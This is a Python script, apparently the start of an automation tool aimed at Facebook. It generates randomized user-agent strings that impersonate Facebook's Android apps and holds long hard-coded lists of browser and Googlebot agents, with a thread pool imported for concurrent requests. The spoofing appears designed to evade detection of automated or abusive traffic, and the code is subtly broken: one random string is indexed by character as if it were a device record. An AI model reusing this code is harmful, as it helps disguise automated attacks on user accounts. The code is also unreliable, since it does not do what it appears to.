#!/usr/bin/python3
import os,time,random,json,sys
try:
    import requests
except:
    os.system("pip3 install requests")
    import requests 
from concurrent.futures import ThreadPoolExecutor as ThreadPool
def ua():
    rr=random.randint
    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    rx=random.randrange(1, 999)
    xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
    return xx
suuu = []
samiya=[]
fahmida = []
fariya=[]
ugen=[]

for i in range(1):
    fbs = random.choice([
        'com.facebook.adsmanager',
        'com.facebook.lite',
        'com.facebook.orca',
        'com.facebook.katana',
        'com.facebook.mlite'])
    application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
    application_version_code = str(random.randint(000000000,999999999))
    android_version = str(random.randrange(5,15))
    dens = str(random.randrange(0,5))
    xzx = random.choice(['Samsung', 'Galaxy A7(2016)', 'a7xltechn', 'SM-A710XZ', 'Absolute', 'GT-B9120', 'GT-B9120', 'Acclaim', 'SCH-R880', 'SCH-R880', 'Admire', 'SCH-R720', 'SCH-R720', 'Amazing', 'amazingtrf', 'SGH-S730M', 'Baffin', 'baffinltelgt', 'SHV-E270L', 'Captivate Glide', 'SGH-I927 Samsung-SGH-I927', 'Captivate Glide', 'SGH-I927', 'SGH-I927', 'China Telecom', 'kylevectc', 'SCH-I699I', 'Chromebook Plus', 'kevin_cheets', 'kevin', 'Chromebook Plus', 'kevin_cheets Samsung Chromebook Plus', 'Chromebook Pro', 'caroline_cheets', 'caroline', 'Chromebook Pro', 'caroline_cheets Samsung Chromebook Pro', 'Conquer', 'SPH-D600', 'SPH-D600', 'DoubleTime', 'SGH-I857 Samsung-SGH-I857', 'Droid Charge', 'SCH-I510', 'SCH-I510', 'Elite', 'eliteltechn', 'SM-G1600', 'Elite', 'elitexltechn', 'SM-G1650', 'Europa', 'GT-I5500B', 'GT-I5500B', 'Europa', 'GT-I5500L', 'GT-I5500L', 'Europa', 'GT-I5500M', 'GT-I5500M', 'Europa', 'GT-I5503T', 'GT-I5503T', 'Europa', 'GT-I5510L', 'GT-I5510L', 'Exhibit', 'SGH-T759', 'SGH-T759', 'Galaxy (China)', 'GT-B9062', 'GT-B9062', 'Galaxy 070', 'hendrix', 'YP-GI2', 'Galaxy A', 'archer', 'archer', 'Galaxy A', 'archer', 'SHW-M100S', 'Galaxy A3 (2017)', 'a3y17lte', 'SM-A320Y', 'Galaxy A3', 'a33g', 'SM-A300H', 'Galaxy A3', 'a3lte', 'SM-A300F', 'Galaxy A3', 'a3lte', 'SM-A300M', 'Galaxy A3', 'a3lte', 'SM-A300XZ', 'Galaxy A3', 'a3lte', 'SM-A300YZ', 'Galaxy A3', 'a3ltechn', 'SM-A3000', 'Galaxy A3', 'a3ltechn', 'SM-A300X', 'Galaxy A3', 'a3ltectc', 'SM-A3009', 'Galaxy A3', 'a3ltedd', 'SM-A300G', 'Galaxy A3', 'a3lteslk', 'SM-A300F', 'Galaxy A3', 'a3ltezh', 'SM-A3000', 'Galaxy A3', 'a3ltezt', 'SM-A300YZ', 'Galaxy A3', 'a3ulte', 'SM-A300FU', 'Galaxy A3', 'a3ulte', 'SM-A300XU', 'Galaxy A3', 'a3ulte', 'SM-A300Y', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310F', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310M', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310X', 'Galaxy A3(2016)', 'a3xelte', 'SM-A310Y', 'Galaxy A3(2016)', 'a3xeltekx', 'SM-A310N0', 'Galaxy A3(2017)', 'a3y17lte', 'SM-A320F', 'Galaxy A3(2017)', 'a3y17lte', 'SM-A320FL', 'Galaxy A3(2017)', 'a3y17lte', 'SM-A320X', 'Galaxy A5', 'a53g', 'SM-A500H', 'Galaxy A5', 'a5lte', 'SM-A500F', 'Galaxy A5', 'a5lte', 'SM-A500G', 'Galaxy A5', 'a5lte', 'SM-A500M', 'Galaxy A5', 'a5lte', 'SM-A500XZ', 'Galaxy A5', 'a5ltechn', 'SM-A5000', 'Galaxy A5', 'a5ltechn', 'SM-A500X', 'Galaxy A5', 'a5ltectc', 'SM-A5009', 'Galaxy A5', 'a5ltezh', 'SM-A5000', 'Galaxy A5', 'a5ltezt', 'SM-A500YZ', 'Galaxy A5', 'a5ulte', 'SM-A500FU', 'Galaxy A5', 'a5ulte', 'SM-A500Y', 'Galaxy A5', 'a5ultebmc', 'SM-A500W', 'Galaxy A5', 'a5ultektt', 'SM-A500K', 'Galaxy A5', 'a5ultelgt', 'SM-A500L', 'Galaxy A5', 'a5ulteskt', 'SM-A500F1', 'Galaxy A5', 'a5ulteskt', 'SM-A500S', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510F', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510M', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510X', 'Galaxy A5(2016)', 'a5xelte', 'SM-A510Y', 'Galaxy A5(2016)', 'a5xeltecmcc', 'SM-A5108', 'Galaxy A5(2016)', 'a5xeltektt', 'SM-A510K', 'Galaxy A5(2016)', 'a5xeltelgt', 'SM-A510L', 'Galaxy A5(2016)', 'a5xelteskt', 'SM-A510S', 'Galaxy A5(2016)', 'a5xeltextc', 'SM-A510Y', 'Galaxy A5(2016)', 'a5xltechn', 'SM-A5100', 'Galaxy A5(2016)', 'a5xltechn', 'SM-A5100X', 'Galaxy A5(2016)', 'a5xltechn', 'SM-A510XZ', 'Galaxy A5(2017)', 'a5y17lte', 'SM-A520F', 'Galaxy A5(2017)', 'a5y17lte', 'SM-A520X', 'Galaxy A5(2017)', 'a5y17ltecan', 'SM-A520W', 'Galaxy A5(2017)', 'a5y17ltektt', 'SM-A520K', 'Galaxy A5(2017)', 'a5y17ltelgt', 'SM-A520L', 'Galaxy A5(2017)', 'a5y17lteskt', 'SM-A520S', 'Galaxy A5x(2016)', 'a5xeltextc', 'SM-A510Y', 'Galaxy A7', 'a73g', 'SM-A700H', 'Galaxy A7', 'a7alte', 'SM-A700F', 'Galaxy A7', 'a7lte', 'SM-A700FD', 'Galaxy A7', 'a7lte', 'SM-A700X', 'Galaxy A7', 'a7ltechn', 'SM-A7000', 'Galaxy A7', 'a7ltechn', 'SM-A700YD', 'Galaxy A7', 'a7ltectc', 'SM-A7009', 'Galaxy A7', 'a7ltektt', 'SM-A700K', 'Galaxy A7', 'a7ltelgt', 'SM-A700L', 'Galaxy A7', 'a7lteskt', 'SM-A700S', 'Galaxy A7(2016)', 'a7xelte', 'SM-A710F', 'Galaxy A7(2016)', 'a7xelte', 'SM-A710M', 'Galaxy A7(2016)', 'a7xelte', 'SM-A710X', 'Galaxy A7(2016)', 'a7xeltecmcc', 'SM-A7108', 'Galaxy A7(2016)', 'a7xeltektt', 'SM-A710K', 'Galaxy A7(2016)', 'a7xeltelgt', 'SM-A710L', 'Galaxy A7(2016)', 'a7xelteskt', 'SM-A710S', 'Galaxy A7(2016)', 'a7xeltextc', 'SM-A710Y', 'Galaxy A7(2016)', 'a7xltechn', 'SM-A7100', 'Galaxy A7(2017)', 'a7y17lte', 'SM-A720F', 'Galaxy A7(2017)', 'a7y17lteskt', 'SM-A720S', 'Galaxy A8', 'a8elte', 'SM-A800F', 'Galaxy A8', 'a8elte', 'SM-A800YZ', 'Galaxy A8', 'a8elteskt', 'SM-A800S', 'Galaxy A8', 'a8hplte', 'SM-A800I', 'Galaxy A8', 'a8hplte', 'SM-A800IZ', 'Galaxy A8', 'a8ltechn', 'SM-A8000', 'Galaxy A8', 'a8ltechn', 'SM-A800X', 'Galaxy A8', 'SCV32', 'SCV32', 'Galaxy A8(2016)', 'a8xelte', 'SM-A810F', 'Galaxy A8(2016)', 'a8xelte', 'SM-A810YZ', 'Galaxy A8(2016)', 'a8xelteskt', 'SM-A810S', 'Galaxy A9 Pro', 'a9xproltechn', 'SM-A9100', 'Galaxy A9 Pro', 'a9xproltesea', 'SM-A910F', 'Galaxy A9(2016)', 'a9xltechn', 'SM-A9000', 'Galaxy Ace 4 Lite', 'vivalto3g', 'SM-G313U', 'Galaxy Ace 4', 'vivaltods5m', 'SM-G313HU', 'Galaxy Ace 4', 'vivaltods5m', 'SM-G313HY', 'Galaxy Ace 4', 'vivaltods5m', 'SM-G313M', 'Galaxy Ace 4', 'vivaltods5m',])
    try:
        suuu.append(f'Dalvik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(xzx[3])} Build/{str(xzx[2])} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density='+dens+'.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBMF/{str(xzx[0])};FBBD/{str(xzx[0])};FBPN/{str(fbs)};FBDV/{str(xzx[3])};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]')
    except IndexError:
        pass
        
        
        
        
for xd in range(1):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    paku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    fahmida.append(paku2)
    
    
    a='Dalvik/2.1.0 (Linux; U; Android'
    b=random.randrange(6, 15)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
    pakuu=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
    fariya.append(pakuu)
    
    numan = fahmida+fariya+suuu  
#--------------------(USER AGENT)------------------------#
a="Mozilla/5.0 (Linux; Android 13; M2101K7BNY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
b="Mozilla/5.0 (Linux; Android 10; Redmi 8A Dual) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
c="Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
d="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.21244.129 Safari/537.36 CCleaner/113.0.21244.129"
e="Mozilla/5.0 (Linux; Android 8.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
f="Mozilla/5.0 (Linux; Android 12; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
g="Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
h="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.121 Safari/537.36"
i="Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
j="Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/537.36 (KHTML, like Gecko; Mediapartners-Google) Chrome/113.0.5672.63 Mobile Safari/537.36"
k="Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/537.36 (KHTML, like Gecko; Mediapartners-Google) Chrome/113.0.5672.92 Mobile Safari/537.36"
l="Mozilla/5.0 (Linux; Android 11; IN_2b Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.162 Mobile Safari/537.36"
m="Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
n="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/537.36 (KHTML, like Gecko, Mediapartners-Google) Chrome/113.0.5672.63 Safari/537.36"
o="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/537.36 (KHTML, like Gecko, Mediapartners-Google) Chrome/113.0.5672.92 Safari/537.36"
p="Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/537.36 (KHTML, like Gecko; Mediapartners-Google) Chrome/113.0.5672.126 Mobile Safari/537.36"
q="Mozilla/5.0 (X11; CrOS aarch64 13597.84.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.95 Safari/537.36"
r="Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
s="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/537.36 (KHTML, like Gecko, Mediapartners-Google) Chrome/113.0.5672.126 Safari/537.36"
t="Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/113.0.5672.92 Safari/537.36"
u="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.21244.128 Safari/537.36 AVG/113.0.21244.128"
v="Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/113.0.5672.63 Safari/537.36"
w="Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/113.0.5672.126 Safari/537.36"
x="Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
y="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.21244.127 Safari/537.36 Avast/113.0.21244.127"
z="Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
aa="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Avast/113.0.21244.127"
bb="Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
cc="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Avast/113.0.21244.127"
dd="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36"
ee="Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
ff="Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.63 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
gg="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 uacq"
hh="Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
ii="Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.92 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
jj="Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.126 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
kk="Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
ll="Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
mm="Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36"
nn="Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
oo="Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
pp="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
qq="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
rr="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
ss="Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
tt="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
uu="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36"
vv="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14"
ww="Mozilla/5.0 (Linux; Android 6.0.1; SM-G920F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/109.0.0.15.71;]"
xx="Mozilla/5.0 (X11; U; Linux x86_64; pl-PL; rv:1.8) Gecko/20051128 SUSE/1.5-0.1 Firefox/1.5.0.1"
yy="Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0"
zz="Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 [FBAN/FBIOS;FBAV/59.0.0.51.142;FBBV/33266808;FBRV/0;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.2;FBSS/3;FBCR/Telkomsel;FBID/phone;FBLC/en_US;FBOP/5]"
ab="Mozilla/5.0 (Linux; Android 5; en-us; DROID4 4G Build/6.7.2-180_DR4-16_M2-37) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/149.0.4529.141 Mobile Safari/537.36"
vv="Mozilla/5.0 (Linux; Android {10}; SM-A305GN Build/PPR1.247706.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6265.94 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/337.1.0.11.118;]"
zxx=(ab,vv,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,aa,bb,cc,dd,ee,ff,gg,hh,ii,jj,kk,ll,mm,nn,oo,pp,qq,rr,ss,tt,uu,vv,ww,xx,yy,zz)
ugen.append(zxx)
#_____________+___________#
akx="Mozilla/5.0 (Linux; arm_64; Android 12; CPH2159) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaBrowser/23.1.7.38.00 SA/3 Mobile Safari/537.36"
akx1="Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648"
akx2="Mozilla/5.0 (Linux; Android 8.1.0; ZB602KL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36"
akx3="Mozilla/5.0 (Linux; Android 9; Redmi Note 5 Build/PKQ1.180904.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 GNews Android/2022120648"
akx4="Mozilla/5.0 (Linux; Android 10; A7 Pro Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648"
akx5="Mozilla/5.0 (Linux; Android 11; CPH2145) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36"
akx6="Mozilla/5.0 (Linux; Android 10; SM-G960F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648"
akx7="Mozilla/5.0 (Linux; Android 13; SM-F700F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 Replaio/3.1.2"
akx8="Mozilla/5.0 (Linux; arm_64; Android 11; RMX3430) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaApp_Android/23.16.1 YaSearchBrowser/23.16.1 BroPP/1.0 SA/3 Mobile Safari/537.36"
akx9="Mozilla/5.0 (Linux; U; Android 13; ru-ru; Xiaomi 12 Lite Build/TKQ1.220807.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.24.1-gn"
akx0="Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/532.0.0 (KHTML, like Gecko) Chrome/32.0.875.0 Safari/532.0.0"
akx10="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_7) AppleWebKit/531.0.0 (KHTML, like Gecko) Chrome/29.0.847.0 Safari/531.0.0"
akx11="Mozilla/5.0 (Windows NT 5.2; WOW64; rv:8.4) Gecko/20100101 Firefox/8.4.2"
akx12="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.0.2 (KHTML, like Gecko) Chrome/30.0.895.0 Safari/537.0.2"
akx13="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_1 rv:4.0; LT) AppleWebKit/533.0.2 (KHTML, like Gecko) Version/6.1.0 Safari/533.0.2"
akx14="Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8.9; rv:10.8) Gecko/20100101 Firefox/10.8.8"
akx15="Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4 rv:4.0; AB) AppleWebKit/532.1.2 (KHTML, like Gecko) Version/5.1.1 Safari/532.1.2"
akx16="Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/532.0.1 (KHTML, like Gecko) Chrome/24.0.891.0 Safari/532.0.1"
akx17="Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.3; Trident/5.1; .NET CLR 4.4.84894.6)"
akx18="Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/532.0.1 (KHTML, like Gecko) Chrome/38.0.838.0 Safari/532.0.1"
akx19="Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.3; Trident/7.0; .NET CLR 4.1.89512.2)"
akx20="Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/538.2.0 (KHTML, like Gecko) Chrome/26.0.849.0 Safari/538.2.0"
akx21="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0 rv:4.0; MG) AppleWebKit/536.1.0 (KHTML, like Gecko) Version/5.1.10 Safari/536.1.0"
akx22="Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/533.1.0 (KHTML, like Gecko) Chrome/13.0.850.0 Safari/533.1.0"
akx23="Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.2; Trident/3.1; .NET CLR 4.5.92358.2)"
akx24="Mozilla/5.0 (Windows NT 6.2; WOW64; rv:6.4) Gecko/20100101 Firefox/6.4.2"
akx25="Mozilla/5.0 (Windows NT 5.1; Win64; x64; rv:6.3) Gecko/20100101 Firefox/6.3.7"
akx26="Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.2; Trident/3.0; .NET CLR 1.2.74030.3)"
akx27="Mozilla/5.0 (Windows NT 5.2; rv:14.0) Gecko/20100101 Firefox/14.0.9"
akx28="Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/532.1.2 (KHTML, like Gecko) Chrome/17.0.817.0 Safari/532.1.2"
akx29="Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/533.0.0 (KHTML, like Gecko) Chrome/28.0.840.0 Safari/533.0.0"
akx30="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_6) AppleWebKit/536.1.2 (KHTML, like Gecko) Chrome/38.0.862.0 Safari/536.1.2"
akx31="Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/532.2.0 (KHTML, like Gecko) Chrome/39.0.875.0 Safari/532.2.0"
akx32="Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/537.0.2 (KHTML, like Gecko) Chrome/13.0.849.0 Safari/537.0.2"
akx33="Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_7 rv:6.0; JV) AppleWebKit/534.0.2 (KHTML, like Gecko) Version/4.0.10 Safari/534.0.2"
akx34="Opera/12.32 (Windows NT 5.1; U; CE Presto/2.9.167 Version/11.00)"
akx35="Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/534.0.1 (KHTML, like Gecko) Chrome/34.0.852.0 Safari/534.0.1"
akx36="Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_9 rv:2.0; SC) AppleWebKit/538.1.1 (KHTML, like Gecko) Version/6.0.2 Safari/538.1.1"
akx37="Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/537.1.0 (KHTML, like Gecko) Chrome/29.0.861.0 Safari/537.1.0"
akx38="Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/5.1; .NET CLR 3.7.27846.5)"
akx39="Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi 5 Plus MIUI/V10.2.1.0.OEGMIXM)"
akx40="Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-A600F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.4 Chrome/67.0.3396.87 Mobile Safari/537.36"
akx41="Mozilla/5.0 (Linux; Android 9; Redmi Note 7S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36"
akx42="Mozilla/5.0 (Linux; Android 9; SM-A705GM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36"
akx43="Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) GSA/68.0.234683655 Mobile/14G60 Safari/602.1"
akx44="Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36"
akx45="Mozilla/5.0 (Linux; Android 5.1.1; SM-J105F Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 GSA/5.10.32.19.arm"
